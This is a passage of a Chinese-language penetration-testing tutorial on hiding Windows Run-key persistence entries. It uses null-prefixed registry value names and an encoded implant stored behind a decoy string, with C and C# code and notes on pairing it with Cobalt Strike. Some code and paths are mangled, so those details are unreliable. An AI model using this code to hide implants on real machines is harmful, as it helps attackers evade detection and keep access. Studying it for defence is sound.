        NtDeleteValueKey = (_NtDeleteValueKey)GetProcAddress(hNtdll, "NtDeleteValueKey");
        ValueName.Buffer = runkeyPath_trick;
        ValueName.Length = 2 * HIDDEN_KEY_LENGTH; //this value doesn't matter as long as it is non-zero
        ValueName.MaximumLength = 0;
        HKEY hkResult = NULL;
        if (!RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult)) {
            if (!NtDeleteValueKey(hkResult, &ValueName)) {
                printf("SUCCESS deleting hidden run value in registry!n");
            }
            RegCloseKey(hkResult);
        }
    }
先看看 `createHiddenRunKey`：
  * 首先是打开 `HKEY_CURRENT_USER + runkeyPath` 的句柄；
  * 将句柄传递给`NtSetValueKey` ，而`NtSetValueKey`传递的是 `UNICODE_STRING ValueName` ；
  * `ValueName.Buffer` 正常情况下是设置为: `Run` ；
  * 但是我们这里在前面加了一个或多个空值`WCHAR("")` ，构造特殊的注册表；
  * 所以 `ValueName.Buffer` 应该是设置为:`Run` 。
而 `deleteHiddenRunKey` 就更加简单了
  * 调用 `NtDeleteValueKey` 将指定键值删除。
编译运行。
    HiddenRunKey.exe action=create keyvalue="C:WindowsSystem32calc.exe"
打开注册表进行对此键值进行查询时，则会弹窗提示错误。
点击确定后，内容还是之前的，新添加的内容已经成功隐藏。如果使用导出功能，也是提示错误。
同样，点击确定之后，导出的内容没有刚刚添加的内容。至此，添加的注册表已经成功隐藏，就 **看不见** 了。重启起效。
当然，期间也会出现一些小问题，比如有时候添加的注册表无法使用`NtDeleteValueKey` 进行删除，也懒得查找原因了，直接删除
`Run`（这个表项删除后会自建）。
最后，为了方便配合 `Cobalt Strike`使用，用 `C#` 重写以上代码（此重写代码多数取之
[SharpHide](https://github.com/outflanknl/SharpHide) –
之所以只是多数，是因为我在测试时，发现无论创建什么键值，都会提示错误），但是到 `NtQueryValueKey`
就中断了，因各种调试出错，而且当前互联网中几乎没找到有关于它的任何信息，唯一可借鉴的地方是
[NtQueryValueKey.ps1](https://raw.githubusercontent.com/jaredcatkinson/PSReflect-Functions/master/ntdll/NtQueryValueKey.ps1)。（希望有人能将下面的代码补全）
    [DllImport("ntdll.dll")]
    static extern int NtQueryValueKey(
        UIntPtr KeyHandle,
          IntPtr ValueName,
         KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
          IntPtr KeyValueInformation,
         UInt32 length,
         out UInt32 ResultLength
    );
    [StructLayout(LayoutKind.Sequential)]
    public struct KEY_VALUE_FULL_INFORMATION
    {
        public UInt32 TitleIndex;
        public UInt32 Type;
        public UInt32 DataOffset;
        public UInt32 DataLength;
        public UInt32 NameLength;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
        public char[] Name;
    }
    Status = NtQueryValueKey(regKeyHandle, ValueNamePtr, KeyValueFullInformation, 0, keyBuffer, out keyBuffer);
效果图：
### 3.2、特殊的 `ValueData`
第一种隐藏技术，是针对 `ValueName` 做的处理。本小节使用的是 [Fileless
Malware](https://blog.trendmicro.com.tw/?tag=fileless-malware)
技术，是有效的针对`ValueData` 的内容进行处理。
这里使用的是 [Fileless Malware](https://blog.trendmicro.com.tw/?tag=fileless-malware) 技术，但是在查看键值时，也会像第一种技术一样会提示错误，但是除了指定的可见字符外，会将其他内容进行隐藏。与第一种技术一致，该内容无法导出。
    // this writes the binary buffer of the encoded implant to the registry as a sting
    // according to winnt.h, REG_SZ is "Unicode nul terminated string"
    // When the value is exported, only part of the value will actually be exported.
    char decoy[] = "(value not set)";
    ....
    void writeHiddenBuf(char *buf, DWORD buflen, const char *decoy, char *keyName, const char* valueName) {
        HKEY hkResult = NULL;
        BYTE *buf2 = (BYTE*)malloc(buflen + strlen(decoy) + 1);
        strcpy((char*)buf2, decoy);
        buf2[strlen(decoy)] = 0;
        memcpy(buf2 + strlen(decoy) + 1, buf, buflen);
        if (!RegOpenKeyExA(HKEY_CURRENT_USER, keyName, 0, KEY_SET_VALUE, &hkResult))
        {
            printf("Key opened!n");
            LSTATUS lStatus = RegSetValueExA(hkResult, valueName, 0, REG_SZ, (const BYTE *)buf2, buflen + strlen(decoy) + 1);
            printf("lStatus == %dn", lStatus);
            RegCloseKey(hkResult);
        }
        free(buf2);
    }
    void readHiddenBuf(BYTE **buf, DWORD *buflen, const char *decoy, char * keyName, const char* valueName) {
        HKEY hkResult = NULL;
        LONG nError = RegOpenKeyExA(HKEY_CURRENT_USER, keyName, NULL, KEY_ALL_ACCESS, &hkResult);
        RegQueryValueExA(hkResult, valueName, NULL, NULL, NULL, buflen);
        *buf = (BYTE*)malloc(*buflen);
        RegQueryValueExA(hkResult, valueName, NULL, NULL, *buf, buflen);
        RegCloseKey(hkResult);
        *buflen -= (strlen(decoy) + 1);
        BYTE *buf2 = (BYTE*)malloc(*buflen);
        memcpy(buf2, *buf + strlen(decoy) + 1, *buflen);
        free(*buf);
        *buf = buf2;
    }
先看看 `writeHiddenBuf`
  * 将 `decoy` 设置成 **(value not set)**
  * 然后将我们利用`Fileless Malware` 处理过的 **buffer** 放在 **(value not set)** 后面
  * 通过 _3.1 小节_ 可知，`Regedit` 会自动截断，达到隐藏的效果​
**只要 RegSetValueExA 传递的 decoy 字符串的长度+隐藏缓冲区的长度，它将把整个缓冲区写入注册表，达到隐藏效果。**
## 0x04 参考
[InvisibleRegValues_Whitepaper.pdf](https://github.com/ewhitehats/InvisiblePersistence/blob/master/InvisibleRegValues_Whitepaper.pdf)
[渗透技巧——“隐藏”注册表的创建](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/)
[Hiding Registry keys with PSReflec](https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353)
[SharpHide](https://github.com/outflanknl/SharpHide)
[Hidden Registry
Keys](https://web.archive.org/web/20091104223505/http://technet.microsoft.com/en-us/sysinternals/bb897446.aspx)